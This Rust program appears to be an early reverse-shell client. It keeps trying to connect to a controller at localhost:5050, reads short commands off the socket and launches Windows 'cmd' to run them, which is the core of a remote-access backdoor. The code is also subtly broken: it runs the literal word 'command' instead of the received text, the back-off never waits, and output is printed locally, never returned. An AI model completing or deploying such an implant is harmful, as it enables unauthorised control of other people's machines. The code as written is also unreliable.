use std::io::prelude::*;
use std::net::TcpStream;
use std::str::from_utf8;
use std::str;
use std::process::{Command, Output};

fn establish_connection(mut wait: i64) -> TcpStream{
    if wait > 1800 { wait = 1800 }
    if let Ok(stream) = TcpStream::connect("localhost:5050") {
        println!("Connected to the server!");
        return stream;
    } else {
        establish_connection(wait*2)
    }
}

fn main() -> std::io::Result<()> {
    let mut stream: TcpStream  = establish_connection(10);
    loop{
        let mut data = [0 as u8; 6];
        match stream.read(&mut data) {
            Ok(_) => {
                let command = from_utf8(&data).unwrap();
                let output = Command::new("cmd")
                    .arg("command")
                    .output()
                    .expect("failed to execute process");

            println!("status: {}", output.status);
            println!("stdout: {}", String::from_utf8_lossy(&output.stdout));
            println!("stderr: {}", String::from_utf8_lossy(&output.stderr));

            ()
            },
            Err(_) => () 
        }
    }
}